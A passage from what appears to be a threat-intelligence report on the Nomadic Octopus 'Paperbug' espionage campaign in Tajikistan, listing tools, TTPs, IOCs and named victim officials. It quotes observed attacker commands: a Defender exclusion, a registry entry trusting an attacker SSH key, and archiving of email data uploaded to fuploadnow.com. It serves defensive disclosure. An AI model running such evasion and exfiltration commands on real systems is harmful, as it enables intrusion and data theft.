6698. It shall be noted that PRODAFT provides this information “as is” according to its findings, without\n\nidi l ll li bl t di l t f th t t Th f ith thi t\n\n\n-----\n\n18. powershell.exe Get-MpThreatDetection\nGets active and past malware threats that Windows Defender detected.[2]\nOperator runs this command especially after downloading additional tools into victim’s\ndevice.\n19. powershell.exe Add-MpPreference -ExclusionPath \\”C:\\Intel\\”\nConfigure Microsoft Defender exclusions for files opened by processes and exclude the\ndefined directory.\n\nTable 8 covers all tools used in the Paperbug operation. Additionally, the operator tries\nseveral times to get a reverse interactive shell with various tools from devices in the\ngovernment network, but it seems like they failed to pass the local proxy server most of the\ntime. The PTI team has observed the Nomadic Octopus operators try to bypass this local\nproxy server by creating reverse socks connections using tools like Chisel.\n\nInvoke-SocksProxy.psm1\npproxy\ndesproxy\ngost\nfrpc\nplink\nPuTTY\nnbtscan\nPetitPotam\nntlmrelayx\nPowerUp.ps1\nwinvnc\nLaZagne\nTater.ps1\nChisel\n\n**Table 8. Used Tools by the group**\n\nThe operator also tried to install putty and add self public key\n```\ncmd.exe /c (\nreg add \"HKCU\\Software\\SimonTatham\\PuTTY\\SshHostKeys\"\n /v \"rsa2@443:185.32.126.102\"\n /t REG_SZ\n /d \"0x10001,\n 0xe681b73c596d613b14e1a07ae7b115583df4a8657829c8d53c80c341943098ae274cd604440c667\n 3b2a480acc83fb2e9edb125b70b4a56e9c9b7f7145605913a3fec7e528585de8ec7a50a28515730c0\n 7f2783461157f9364c7666f8c882a1f02ff6f86d9f75e070ef475d0dff0e22f9c7fa511b822efa0fe\n d24f7e81a31931a036e45ca8b57b30e70343676b2f99ccdd102fb19262f563ac0cf19a0d8f34ef785\n a4b959636d83bacc860308bb9f56662912c5c97ebf0e440a13019183a58432426e8f43cd3a8f7158d\n db629ee78034eb1c8cb1ccbf4a6bdcf20c92f52627b56dd8ef61d0af1906afd4ad90d195acc866a7b\n ad772beb18ac78ece4a5d7d5b6c5\"\n2>&1)\n\n```\n23 / 41\n\nDISCLAIMER : This document and its contents shall be deemed as proprietary and privileged information of PRODAFT and shall\n\nbe subjected to articles and provisions that have been stipulated in the General Data Protection Regulation and Personal\n\nData Protection Law No. 6698. It shall be noted that PRODAFT provides this information “as is” according to its findings, without\n\nidi l ll li bl t di l t f th t t Th f ith thi t\n\n\n-----\n\nThe operator also tries to deploy an SCF File Attack in the same way with the given example\nin pentestlab.blog’s post[6] where even the file name pentestlab.ico remains the same.\n\nAs mentioned earlier, information theft is one of the most critical mission of the Paperbug\noperation, the operator zips The Bat! - Secure Desktop Email Client for Windows 10\nsoftware’s directories and uploads to fuploadnow.com temporarily, this zip&upload process\ncontrolled by the backdoor and the parameters are shown below;\n```\na -v200m {temp} -hp{pass} \\\"C:\\\\Users\\\\USER\\\\AppData\\\\Roaming\\\\The Bat!\\\n# Example output:\nPassword: GegvXm8f60Okdeec\nRAR 5.40 beta 1 x86 Copyright (c) 1993-2016 Alexander Roshal 12 May 2016\nTrial version Type RAR -? for help\nEvaluation copy. Please register.\n\n```\n```\nCreating archive C:\\Users\\USER\\AppData\\Local\\Temp\\1303787165\\MFVZ.rar\nAdding C:\\Users\\USER\\AppData\\Roaming\\The Bat!\\AccOrder.CFG OK\nAdding C:\\Users\\USER\\AppData\\Roaming\\The Bat!\\Account.CFN OK\nAdding C:\\Users\\USER\\AppData\\Roaming\\The Bat!\\ACCOUNT.FLB OK\nAdding C:\\Users\\USER\\AppData\\Roaming\\The Bat!\\ACCOUNT.SRB OK\nAdding C:\\Users\\USER\\AppData\\Roaming\\The Bat!\\ACCOUNT.~FLB OK\nAdding C:\\Users\\USER\\AppData\\Roaming\\The Bat!\\ADDRBOOK.INI OK\nAdding C:\\Users\\USER\\AppData\\Roaming\\The Bat!\\autobackup.$1 OK\nAdding C:\\Users\\USER\\AppData\\Roaming\\The Bat!\\autobackup.$10\nCalculating the checksum\n...\n...\n...\nUpload 46 BBNuXzjm.tmp\nDownload: http://fuploadnow.com/download/{random hex values}\nRemove: http://fuploadnow.com/remove/{random hex values}/{random hex values}\n...\n...\n...\n\n```\nAlso downloaded custom executable can gather all defined filetypes in provided directory\nbetween provided dates.\n\n```\ncmd.exe /c\n    (C:\\\\Users\\\\user\\\\AppData\\\\Local\\\\Temp\\\\svh{ast}.exe\n    \\\"C:\\\\Users\\\\user\\\\Desktop\\\"\n    \\\"txt,doc,docx,xls,xlsx,pdf\\\"\n    \\\"01.01.2021-07.09.2021\\\"\n    25\n2>&1)\n\n```\n\n24 / 41\n\nDISCLAIMER : This document and its contents shall be deemed as proprietary and privileged information of PRODAFT and shall\n\nbe subjected to articles and provisions that have been stipulated in the General Data Protection Regulation and Personal\n\nData Protection Law No. 6698. It shall be noted that PRODAFT provides this information “as is” according to its findings, without\n\nidi l ll li bl t di l t f th t t Th f ith thi t\n\n\n-----\n\n#### 4.5 De-Anonymization\n\nTable 9 shows all nicknames that show up in the command and control panel’s settings\ntab. Unfortunately, there is no further information available about the group’s identity.\n\nwitwit\nRundel\nencrypt\nDevX\n\n**Table 9. Nicknames that are in C&C’s Settings tab**\n\n**Figure 18. Paperbug operation panel**\n\nTable 10 shows all public servers used daily by the group.\n\n**IP Address** **AS Name** **First Seen**\n185.32.126.102 FSIT AG 18-03-2021\n194.180.174.154 MivoCloud SRL 18-03-2021\n\n**Table 10. Nomadic Octopus managed IPs and AS Names**\n\n### 5 Statistics & Observations\n\nThis section covers some important insights regarding Paperbug’s impact. Here we\npresent our findings from the C&C server, which are valuable to profiling the group and\nactions.\n\n25 / 41\n\nDISCLAIMER : This document and its contents shall be deemed as proprietary and privileged information of PRODAFT and shall\n\nbe subjected to articles and provisions that have been stipulated in the General Data Protection Regulation and Personal\n\nData Protection Law No. 6698. It shall be noted that PRODAFT provides this information “as is” according to its findings, without\n\nidi l ll li bl t di l t f th t t Th f ith thi t\n\n|IP Address|AS Name|First Seen|\n|---|---|---|\n|185.32.126.102|FSIT AG|18-03-2021|\n|194.180.174.154|MivoCloud SRL|18-03-2021|\n\n\n-----\n\nAccording to last response dates from ’s network, they lost most of the connections\nexcept the device running Windows Server 2003. This connection has been alive since 03\n**November 2020. This also means that, Nomadic Octopus group cannot gather information**\nfrom engineers/operators for 2 years. As mentioned before, the operator deletes\nthe long gone connections. The difference can be seen in between Figure 19 and Figure 20. It\nmust also be noted that the connection to **.** **.** was lost time to time. However,\nit has been recovered back again.\n\n**Figure 19. Previous Victim Table of the Telecom Network**\n\n**Figure 20. Present Victim Table of Telecom Network**\n\n26 / 41\n\nDISCLAIMER : This document and its contents shall be deemed as proprietary and privileged information of PRODAFT and shall\n\nbe subjected to articles and provisions that have been stipulated in the General Data Protection Regulation and Personal\n\nData Protection Law No. 6698. It shall be noted that PRODAFT provides this information “as is” according to its findings, without\n\nidi l ll li bl t di l t f th t t Th f ith thi t\n\n\n-----\n\n**ID 381’s note says it is** **.** **.** and this domain also has web service that could be\nreached publicly, named as Work Time platform. However, it is not certain that Nomadic\nOctopus gained their first access through this service.\n\n**Figure 21. The Work Time Web Platform**\n\nAccording to the PTI Team’s observations, the backdoors with the word icon are placed\nto directories that are shared in the network. In these occasions, the backdoor naming is\ngenerally related with surveys, performance reports and extension of these backdoors is\n**.docx.exe. With this doubly extension technique, people might have deceived to run these**\nbackdoors by mistake.\n\nAs can be seen in the panel screenshots given in Figure 12, ID numbers of victims rises\nincrementally, with this we can conclude that the group established 499 successful\nconnections in total, but they either discarded the connections purposefully because it\nis not within their interest or the connections were simply lost.\n\n27 / 41\n\nDISCLAIMER : This document and its contents shall be deemed as proprietary and privileged information of PRODAFT and shall\n\nbe subjected to articles and provisions that have been stipulated in the General Data Protection Regulation and Personal\n\nData Protection Law No. 6698. It shall be noted that PRODAFT provides this information “as is” according to its findings, without\n\nidi l ll li bl t di l t f th t t Th f ith thi t\n\n\n-----\n\nAfter the backdoor is planted into victim devices, as explained before, the threat actors can\nexecute commands on the device from the command and control panel directly. According\nto the executed commands’ date and times, figure 22 shows Nomadic Octopus’ weekly\nactive hours;\n\n**Figure 22. Nomadic Octopus’ Activity Heatmap (GMT+0)**\n\nThis activity graph matches mostly with GMT+5, which is also Tajikistan’s official timezone.\nConsidering that most of compromised devices are workstations of the officers/employees\nwho are only active on devices in work hours of the victims, any attribution attempt based\non operator’s timezone would be be inaccurate.\n\n28 / 41\n\nDISCLAIMER : This document and its contents shall be deemed as proprietary and privileged information of PRODAFT and shall\n\nbe subjected to articles and provisions that have been stipulated in the General Data Protection Regulation and Personal\n\nData Protection Law No. 6698. It shall be noted that PRODAFT provides this information “as is” according to its findings, without\n\nidi l ll li bl t di l t f th t t Th f ith thi t\n\n\n-----\n\n#### 5.1 Interested Profiles\n\n**Figure 23. Tajikistan Government Network**\n\nAs explained before in C&C Analysis, the network tagged as 25.1 is government network\ndevices. Table 11 shows compromised devices’ possible owners. It can be seen that also one\nof government’s DC is compromised.\n\n**Name Surname** **Position**\nSharifi Abdulaziz Human Resources Executive Officer\nKhudoyor Khudoyorzoda Transport Minister\nBobisho Kholzoda Agriculture and Environmental\nProtection Executive Officer\n**Unidentified**\nRahmonzoda Saidnakhsh Hakim Deputy Minister of Internal Affairs\n**Unidentified**\nQurbonzoda Amirkhon Fayzullo Deputy Chairman of Khatlon\nProvince\n\n**Table 11. Government Victims**\n\n29 / 41\n\nDISCLAIMER : This document and its contents shall be deemed as proprietary and privileged information of PRODAFT and shall\n\nbe subjected to articles and provisions that have been stipulated in the General Data Protection Regulation and Personal\n\nData Protection Law No. 6698. It shall be noted that PRODAFT provides this information “as is” according to its findings, without\n\nidi l ll li bl t di l t f th t t Th f ith thi t\n\n|Name Surname|Col2|Col3|Col4|Col5|Col6|Position|\n|---|---|---|---|---|---|---|\n|Sharifi Abdulaziz||||||Human Resources Executive Officer|\n|Khudoyor Khudoyorzoda||||||Transport Minister|\n|Bobisho Kholzoda||||||Agriculture and Environmental Protection Executive Officer|\n|||||||Unidentified|\n|Rahmonzoda Saidnakhsh Hakim||||||Deputy Minister of Internal Afaf irs|\n|||||||Unidentified|\n|Qurbonzoda Amirkhon Fayzullo||||||Deputy Chairman of Khatlon Province|\n\n\n-----\n\n#### 5.2 Other Targets In Scope\n\nThe Group interest also covers OT devices, according to **- Clients tab; there are 4 gas**\nstation and one cash register. Figure 24 and 25 are example screenshots taken by the group.\n\n**Figure 24. Screenshot of one of the gas stations’ device**\n\n**Figure 25. Screenshot of the device that noted as cash register**\n\n30 / 41\n\nDISCLAIMER : This document and its contents shall be deemed as proprietary and privileged information of PRODAFT and shall\n\nbe subjected to articles and provisions that have been stipulated in the General Data Protection Regulation and Personal\n\nData Protection Law No. 6698. It shall be noted that PRODAFT provides this information “as is” according to its findings, without\n\nidi l ll li bl t di l t f th t t Th f ith thi t\n\n\n-----\n\n### 6 Appreciations\n\n**Paperbug operation is an example of new world espionage stories. This and other**\nadvanced persistent threat actors prove that the cyberspace is a new domain in terms of\nmodern warfare. Beside the existing human intelligence factor’s importance in gathering\ninformation, these findings show how much a group can lurk in organizations remotely even\nwith many blunders while executing the operation, unlike other espionage techniques. Other\ntypes of espionage does not have that much fault tolerance.\n\nThe PTI team was able to gain valuable insight into how Nomadic Octopus organizes its\nactivities and achieves its goals. This will help inform cybersecurity policies designed to\nprotect against similar motivated operations.\n\nAccording to the PTI team observations, the group usually does not know which device\nthey gained access to. From how Nomadic Octopus group eliminates or keeps connection\ndecision, it is clear to see that Nomadic Octopus is actively searching for OT devices,\ngovernment networks and officers and public service infrastructures. These targets enable\nthem to gather closed confidential sources and surveillance on Tajikistan and its people.\nThis motivation is also supported by the reason the group have not stopped spying on\n\nand its employees. The group desires to gather information wherever it can.\n\nAlthough the entire target list is unknown, The group may initiate other campaigns towards\nto geographically and politically close to Tajikistan. Used language (Russian) in command\nand control panel is very common in the close geographical area. Thus, it can also hint the\ngroup’s origin and interested and favored territories.\n\nProactive detection strategies are critical for overcoming fast-moving threats like this\noperation. Broadly defined prevention-based security may help mitigate some of the most\nobvious threats, but the reality of today’s mature, organized cybercrime industry requires a\nnew strategy. Business leaders and cybersecurity decision-makers must actively search\nfor new cybercrime trends and implement solutions for patching new vulnerabilities in their\nnetworks.\n\n31 / 41\n\nDISCLAIMER : This document and its contents shall be deemed as proprietary and privileged information of PRODAFT and shall\n\nbe subjected to articles and provisions that have been stipulated in the General Data Protection Regulation and Personal\n\nData Protection Law No. 6698. It shall be noted that PRODAFT provides this information “as is” according to its findings, without\n\nidi l ll li bl t di l t f th t t Th f ith thi t\n\n\n-----\n\n#### 6.1 Preventing Another Paperbug\n\nOperation Paperbug is a scary reminder that espionage operations can easily fly under\nthe radar and sensitive information can be leaked without the owners even realizing. This is\nwhy we chose to add a section on how organizations can stay safe from such attacks. One\nof the crucial aspects of ensuring protection is to configure network security configurations\ncorrectly. This includes setting up firewalls, encryption protocols, and other security measures\nto ensure that unauthorized individuals cannot gain access to your network. Additionally, it\nis essential to regularly update your security systems to protect against new threats that\nmay arise.\n\nAnother important aspect of network security is employee education. Cybersecurity threats\ncan come in many forms, including phishing attacks and other social engineering tactics.\nTherefore, it is essential to train employees about cybersecurity topics and how to identify\nand respond to these threats. Regular training sessions can help raise awareness among\nemployees and teach them to adopt safe practices when accessing the network. Ultimately,\nby training employees about cybersecurity risks, companies can significantly reduce the risk\nof a data breach or other cybersecurity-related incident.\n\nRegularly updating the version of your assets is another critical step in maintaining network\nsecurity. Older versions of software and operating systems are often more susceptible to\ncybersecurity attacks. Updating to the latest version ensures that you have access to the\nlatest security patches, minimizing the risk of an attack. Additionally, it is important to follow\nthe products of your assets for any vulnerabilities that may occur in the products. This allows\nyou to take appropriate measures to address the issue and prevent any potential security\nbreaches.\n\nOne of the most common ways that attackers gain access to a network is through weak\nor easily guessable credentials. Therefore, it is essential to avoid using weak passwords or\ncredentials when accessing the network. Passwords should be complex and difficult to\nguess, including a combination of letters, numbers, and symbols. Additionally, it is essential\nto use two-factor authentication whenever possible to add an extra layer of security to\nyour network. Finally, extensions of downloaded files should always be double checked,\nespecially on windows devices, which often hide the true extension of a file. Overall, taking\nthese steps can help organizations maintain a secure network and prevent any potential\ncybersecurity-related incidents.\n\n32 / 41\n\nDISCLAIMER : This document and its contents shall be deemed as proprietary and privileged information of PRODAFT and shall\n\nbe subjected to articles and provisions that have been stipulated in the General Data Protection Regulation and Personal\n\nData Protection Law No. 6698. It shall be noted that PRODAFT provides this information “as is” according to its findings, without\n\nidi l ll li bl t di l t f th t t Th f ith thi t\n\n\n-----\n\n### 7 TTP\n\nT1595 Active Scanning\n\nScans the devices in the victim’s\n\n.001 Scanning IP Blocks network block.\n\nT1592 Gather Victim Host Information\n\nGathers information on the system\n\n.001 Hardware itself\n\nReconnaissance\n\nGathers information on the OS and\n\n.002 Software installed apps\n\nSteal configurations for\nmessagging apps and email\n\n.004 Client Configurations clients\n\nT1589 Gather Victim Identity Information\n\nGathers user credentials on the\n\n.001 Credentials victim machine\n\nGathers email addresses on the\n\n.002 Email Addresses victim machine\n\nGathers employee information on\n\n.003 Employee Names victim machines\n\nT1590 Gather Victim Network Information\n\nExfiltrates the DNS cache from\n\n.002 DNS machines\n\nDiscovers the network topology of\n\n.004 Network Topology compromised machines\n\nDoes a scan of IP addresses of\n\n.005 IP Addresses connected machines\n\nT1591 Gather Victim Org Information\n\nGathers information about victim’s\nconnections to other possible\n\n.002 Business Relationships victims\n\nTries to identift the role of the victim\n\n.004 Identify Roles within the business context.\n\nResource T1587 Develop Capabilities\nDevelopment\n\nInstalls malware on victim machines\n\n.001 Malware to gain control.\n\n33 / 41\n\nDISCLAIMER : This document and its contents shall be deemed as proprietary and privileged information of PRODAFT and shall\n\nbe subjected to articles and provisions that have been stipulated in the General Data Protection Regulation and Personal\n\nData Protection Law No. 6698. It shall be noted that PRODAFT provides this information “as is” according to its findings, without\n\nidi l ll li bl t di l t f th t t Th f ith thi t\n\n|Reconnaissance|T1595|Active Scanning|Col4|\n|---|---|---|---|\n||.001|Scanning IP Blocks|Scans the devices in the victim’s network block.|\n||T1592|Gather Victim Host Information||\n||.001|Hardware|Gathers information on the system itself|\n||.002|Software|Gathers information on the OS and installed apps|\n||.004|Client Configurations|Steal configurations for messagging apps and email clients|\n||T1589|Gather Victim Identity Information||\n||.001|Credentials|Gathers user credentials on the victim machine|\n||.002|Email Addresses|Gathers email addresses on the victim machine|\n||.003|Employee Names|Gathers employee information on victim machines|\n||T1590|Gather Victim Network Information||\n||.002|DNS|Exfiltrates the DNS cache from machines|\n||.004|Network Topology|Discovers the network topology of compromised machines|\n||.005|IP Addresses|Does a scan of IP addresses of connected machines|\n||T1591|Gather Victim Org Information||\n||.002|Business Relationships|Gathers information about victim’s connections to other possible victims|\n||.004|Identify Roles|Tries to identift the role of the victim within the business context.|\n\n|Resource Development|T1587|Develop Capabilities|Col4|\n|---|---|---|---|\n||.001|Malware|Installs malware on victim machines to gain control.|\n\n\n-----\n\n|Initial Access|T1091|Replication Through Removable Media|Malware checks for USB drives and tries to infect them|\n|---|---|---|---|\n||T1078|Valid Accounts||\n||.002|Domain Accounts|Scans the available domain accounts in the network.|\n||.003|Local Accounts|Scans the local accounts registered in the victi machine|\n\n|Execution|T1059|Command and Scripting Interpreter|Col4|\n|---|---|---|---|\n||.001|PowerShell|Powershell is used to execute commans|\n||.003|Windows Command Shell|cmd.exe /c is used|\n||T1053|Scheduled Task/Job||\n||.002|At (Windows)|Schedules tasks on widows using SCHTASKS to gain persistence|\n||.005|Scheduled Task|Schedules their malware to run periodically on the machine|\n||T1047|Windows Management Instrumentation|Use wmic to get information on hotfixes|\n\n|Persistence|T1547|Boot or Logon Autostart Execution|Col4|\n|---|---|---|---|\n||.001|Registry Run Keys / Startup Folder|Adds malware into the Startup folder of compromised machines|\n||T1136|Create Account||\n||.001|Local Account|Creates a user called Admin on compromised machines|\n\n\n34 / 41\n\nDISCLAIMER : This document and its contents shall be deemed as proprietary and privileged information of PRODAFT and shall\n\nbe subjected to articles and provisions that have been stipulated in the General Data Protection Regulation and Personal\n\nData Protection Law No. 6698. It shall be noted that PRODAFT provides this information “as is” according to its findings, without\n\nidi l ll li bl t di l t f th t t Th f ith thi t\n\n\n-----\n\n|Defense Evasion|T1564|Hide Artifacts|Col4|\n|---|---|---|---|\n||.003|Hidden Window|Creates a hidden powershell window to run commands|\n||T1562|Impair Defenses||\n||.004|Disable or Modify System Firewall|Changes the firewall settings so that it allows their surveillance programs.|\n||T1036|Masquerading||\n||.004|Masquerade Task or Service|Renames tools to appear as system tasks|\n||.005|Match Legitimate Name or Location|Renames tools and puts them in the Mozilla folder|\n\n|Credential Access|T1187|Forced Authentication|Runs a SCF file attack, with the filename pentesterlab.ico|\n|---|---|---|---|\n||T1555|Credentials from Password Stores||\n||.001|Windows Credential Manager|Uses LaZagne to steal credentials from vault files|\n||.003|Credentials from Web Browsers|Uses LaZagne to steal credentials from browsers|\n||T1552|Unsecured Credentials||\n||.001|Credentials In Files|Searches for the string password in the whole computer using LaZagne|\n\n\n35 / 41\n\nDISCLAIMER : This document and its contents shall be deemed as proprietary and privileged information of PRODAFT and shall\n\nbe subjected to articles and provisions that have been stipulated in the General Data Protection Regulation and Personal\n\nData Protection Law No. 6698. It shall be noted that PRODAFT provides this information “as is” according to its findings, without\n\nidi l ll li bl t di l t f th t t Th f ith thi t\n\n\n-----\n\n|Discovery|T1083|File and Directory Discovery|Reads and writes ini files|\n|---|---|---|---|\n||T1135|Network Share Discovery|Lists network shares and printers using net share|\n||T1040|Network Sniffing|Uses victim machines to sniff network packets|\n||T1120|Peripheral Device Discovery|The malware checks peripheral devices in hopes of duplicating itself.|\n||T1057|Process Discovery|Uses the command tasklist to list processes|\n||T1012|Query Registry|Queries and edits registry keys to setup proxy for browser|\n||T1018|Remote System Discovery|Malware checks the hosts file|\n||T1016|System Network Configuration Discovery||\n||.001|Internet Connection Discovery|Pings network endpoints to check if they are reachable|\n||T1033|System Owner/User Discovery|Lists all the users registered in the system|\n||T1007|System Service Discovery|List services and tasks runn|\n\n|Lateral Movement|T1570|Lateral Tool Transfer|Tools are transfered in between victim machines|\n|---|---|---|---|\n||T1021|Remote Services||\n||.001|Remote Desktop Protocol|RDP is used to view and control devices of victims|\n||.005|VNC|VNC is used to view and control devices of victims|\n||T1091|Replication Through Removable Media|Malware checks for USB drives and tries to infect|\n\n\n36 / 41\n\nDISCLAIMER : This document and its contents shall be deemed as proprietary and privileged information of PRODAFT and shall\n\nbe subjected to articles and provisions that have been stipulated in the General Data Protection Regulation and Personal\n\nData Protection Law No. 6698. It shall be noted that PRODAFT provides this information “as is” according to its findings, without\n\nidi l ll li bl t di l t f th t t Th f ith thi t\n\n\n-----\n\n|Collection|T1560|Archive Collected Data|Col4|\n|---|---|---|---|\n||.001|Archive via Utility|Data to be exfiltrated are compressed using the 7z utility|\n||T1185|Browser Session Hijacking|Custom proxy is set for browsers to analyze outgoing traffic (185.32.126.102)|\n||T1074|Data Staged||\n||.001|Local Data Staging|Tools and exfiltrated files are first moved to inconspicously named directories like C : extbackslash intel|\n||T1005|Data from Local System|Important files, like documents, in the local system are exfiltrated|\n||T1025|Data from Removable Media|Files from the removable devices are exfiltrated|\n||T1114|Email Collection||\n||.001|Local Email Collection|The operators collect and read emails of victims|\n||T1113|Screen Capture|The operators capture the screen of victims|\n\n|Command And Control|T1071|Application Layer Protocol|Col4|\n|---|---|---|---|\n||.001|Web Protocols|Posts data to the C2 server|\n||.004|DNS|Runs a DNS lookup for the web server|\n||T1132|Data Encoding||\n||.001|Standard Encoding|Data sent to the C2 server is base64 encoded|\n||T1573|Encrypted Channel||\n||.002|Asymmetric Cryptography|Data sent to the C2 server is encrypted|\n\n|Exfiltration|T1048|Exfiltration Over Alternative Protocol|Col4|\n|---|---|---|---|\n||.003|Exfiltration Over Unencrypted/ Obfuscated Non-C2 Protocol|Data is exfiltrated to via HTTP requests|\n||T1041|Exfiltration Over C2 Channel|Data is exfiltrated via DustSquad’s C2 server|\n\n\n37 / 41\n\nDISCLAIMER : This document and its contents shall be deemed as proprietary and privileged information of PRODAFT and shall\n\nbe subjected to articles and provisions that have been stipulated in the General Data Protection Regulation and Personal\n\nData Protection Law No. 6698. It shall be noted that PRODAFT provides this information “as is” according to its findings, without\n\nidi l ll li bl t di l t f th t t Th f ith thi t\n\n\n-----\n\n### 8 IOC\n\n#### 8.1 C&C Servers\n```\nislandsnake.com\nfootcoinball.com\nlovingearthy.com\n94.140.114.20\n44.227.76.166\n44.227.65.245\n91.219.238.239\n91.208.184.79\n54.36.185.101\n199.188.200.245\n185.99.133.244\n\n 8.2 Threat Actor Related IPs\n185.32.126.102\n194.180.174.154\n86.106.137.150\n\n 8.3 Backdoors\n062ba92736257f6ec1f16e33a8ae507732ab900404785d5f14b05cf4cecd05c2\n979f8156c2f70fb8d699e12bed0d952254688fbcdf385bd4ab54a4ce615c1c3f\ncf8d4ba73c7ebea33ac737f2c95fcc5afab7613cae46362c547141e09ad2239a\nf5203ec8d5259157fd40f2646f0139558293f1dd94727bc9cc328432cdde5779\n6f3882642fa180c5422cbc08f6ad38270964be0cf52fcf91d630b731ae3fc31e\nb0e2fe5ef2f37eb88f288929ee774a555a19eb5b01a2ca03b3d30ec98604ad22\n\n 8.4 Cobalt Strike\n\n```\n```\nb0e2fe5ef2f37eb88f288929ee774a555a19eb5b01a2ca03b3d30ec98604ad22\n\n```\n\n38 / 41\n\nDISCLAIMER : This document and its contents shall be deemed as proprietary and privileged information of PRODAFT and shall\n\nbe subjected to articles and provisions that have been stipulated in the General Data Protection Regulation and Personal\n\nData Protection Law No. 6698. It shall be noted that PRODAFT provides this information “as is” according to its findings, without\n\nidi l ll li bl t di l t f th t t Th f ith thi t\n\n\n-----\n\n### Références\n\n[1] [FBI. ME-000134-MW. url : https://www.iranwatch.org/sites/default/files/public-](https://www.iranwatch.org/sites/default/files/public-intelligence-alert.pdf)\n```\n   intelligence-alert.pdf. (accessed : 02.02.2021).\n\n```\n[2] [Microsoft. Get-MpThreatDetection. url : https : / / docs . microsoft . com / en - us /](https://docs.microsoft.com/en-us/powershell/module/defender/get-mpthreatdetection?view=windowsserver2022-ps)\n```\n   powershell/module/defender/get-mpthreatdetection?view=windowsserver2022-ps.\n\n```\n(accessed : 02.02.2021).\n\n[3] [Microsoft. netstat. url : https : / / docs . microsoft . com / en - us / windows - server /](https://docs.microsoft.com/en-us/windows-server/administration/windows-commands/netstat)\n```\n   administration/windows-commands/netstat. (accessed : 02.02.2021).\n\n```\n[4] [Microsoft. tasklist. url : https : / / docs . microsoft . com / en - us / windows - server /](https://docs.microsoft.com/en-us/windows-server/administration/windows-commands/tasklist)\n```\n   administration/windows-commands/tasklist. (accessed : 02.02.2021).\n\n```\n[5] [Microsoft. whoami. url : https : / / docs . microsoft . com / en - us / windows - server /](https://docs.microsoft.com/en-us/windows-server/administration/windows-commands/whoami)\n```\n   administration/windows-commands/whoami. (accessed : 02.02.2021).\n\n```\n[6] [pentestlab.blog. SMB Share – SCF File Attacks. url : https://pentestlab.blog/2017/](https://pentestlab.blog/2017/12/13/smb-share-scf-file-attacks/)\n```\n  12/13/smb-share-scf-file-attacks/. (accessed : 02.02.2021).\n\n```\n[7] Tara Seals. Windows Zero-Day Actively Exploited in Widespread Espionage Campaign.\n[url : https://threatpost.com/windows-zero-day-exploited-espionage/175432/.](https://threatpost.com/windows-zero-day-exploited-espionage/175432/)\n(accessed : 02.02.2021).\n\n[8] [SecureList. A Slice of 2017 Sofacy Activity. url : https://securelist.com/a-slice-of-](https://securelist.com/a-slice-of-2017-sofacy-activity/83930/)\n```\n   2017-sofacy-activity/83930/. (accessed : 02.04.2021).\n\n```\n[9] [SecureList. Octopus-infested seas of Central Asia. url : https://securelist.com/](https://securelist.com/octopus-infested-seas-of-central-asia/88200/)\n```\n   octopus-infested-seas-of-central-asia/88200/. (accessed : 02.04.2021).\n\n```\n[10] Virus Total. 062ba92736257f6ec1f16e33a8ae507732ab900404785d5f14b05cf4cecd05c2\n_Analysis Report. url :_ `https : / / www . virustotal . com / gui / file /`\n```\n   062ba92736257f6ec1f16e33a8ae507732ab900404785d5f14b05cf4cecd05c2. (accessed :\n\n```\n02.02.2021).\n\n[11] [Unix Wiz. NETBIOS name scanner. url : http://www.unixwiz.net/tools/nbtscan.html.](http://www.unixwiz.net/tools/nbtscan.html)\n(accessed : 02.02.2021).\n\n39 / 41\n\nDISCLAIMER : This document and its contents shall be deemed as proprietary and privileged information of PRODAFT and shall\n\nbe subjected to articles and provisions that have been stipulated in the General Data Protection Regulation and Personal\n\nData Protection Law No. 6698. It shall be noted that PRODAFT provides this information “as is” according to its findings, without\n\nidi l ll li bl t di l t f th t t Th f ith thi t\n\n\n-----\n\n**Acknowledgement**\nWe would like to thank our advisors for their valuable guidance and support throughout this\nresearch.\n\nThe public version of the report will be shared from our github page [3]. The readers can find\nnew samples, IOCs, and new versions of this report from our github page as we will constantly\nupdate our page based on new findings.\n\n[3. https://www.github.com/prodaft](https://www.github.com/prodaft)\n\n40 / 41\n\nDISCLAIMER : This document and its contents shall be deemed as proprietary and privileged information of PRODAFT and shall\n\nbe subjected to articles and provisions that have been stipulated in the General Data Protection Regulation and Personal\n\nData Protection Law No. 6698. It shall be noted that PRODAFT provides this information “as is” according to its findings, without\n\nidi l ll li bl t di l t f th t t Th f ith thi t\n\n\n-----\n\n### Historique\n\n**Version** **Date** **Auteur(s)** **Modifications**\n\n1.0 18.02.2022 PTI Team Initial draft\n1.1 02.01.2023 PTI Team Updated draft version\n2.0 24.03.2023 PTI Team TLP:RED version\n2.1 14.04.2023 PTI Team TLP:CLEAR version\n\n41 / 41\n\nDISCLAIMER : This document and its contents shall be deemed as proprietary and privileged information of PRODAFT and shall\n\nbe subjected to articles and provisions that have been stipulated in the General Data Protection Regulation and Personal\n\nData Protection Law No. 6698. It shall be noted that PRODAFT provides this information “as is” according to its findings, without\n\nidi l ll li bl t di l t f th t t Th f ith thi t\n\n\n-----",
    "language": "EN",
    "sources": [
        {
            "id": "6fc23d14-23a6-4870-8fad-b291b182596f",
            "created_at": "2022-10-25T16:07:18.480113Z",
            "updated_at": "2022-10-25T16:07:18.480113Z",
            "deleted_at": null,
            "name": "ETDA",
            "url": "https://apt.etda.or.th",
            "description": "Threat Group Cards: A Threat Actor Encyclopedia",
            "reports": null
        },
        {
            "id": "bf5be533-fa31-4590-ae37-5761c97ffa34",
            "created_at": "2022-10-25T16:13:58.389257Z",
            "updated_at": "2022-10-25T16:13:58.389257Z",
            "deleted_at": null,
            "name": "Malpedia",
            "url": "https://malpedia.caad.fkie.fraunhofer.de",
            "description": "Malpedia is a free service offered by Fraunhofer FKIE",
            "reports": null
        },
        {
            "id": "99593a68-7f6e-400e-9a9f-a707f66d2e72",
            "created_at": "2022-11-23T11:07:14.353321Z",
            "updated_at": "2022-11-23T11:07:14.353321Z",
            "deleted_at": null,
            "name": "AGRO",
            "url": "https://apt.threattracking.com",
            "description": "APT Groups and Operations Spreadsheet",
            "reports": null
        },
        {
            "id": "6825b8cb-7d82-43d2-b0b0-d51c7e255b42",
            "created_at": "2023-01-06T13:46:37.642134Z",
            "updated_at": "2023-01-06T13:46:37.642134Z",
            "deleted_at": null,
            "name": "MISPGALAXY",
            "url": "https://www.misp-project.org/galaxy.html",
            "description": "MISP Galaxy Clusters",
            "reports": null
        }
    ],
    "references": [
        "https://www.prodaft.com/m/reports/PAPERBUG_TLPWHITE-1.pdf"
    ],
    "report_names": [
        "PAPERBUG_TLPWHITE-1.pdf"
    ],
    "threat_actors": [
        {
            "id": "978775b9-369d-44f7-8a42-76d7b9cb42d5",
            "created_at": "2022-10-25T15:50:23.846105Z",
            "updated_at": "2025-03-27T02:00:55.557895Z",
            "deleted_at": null,
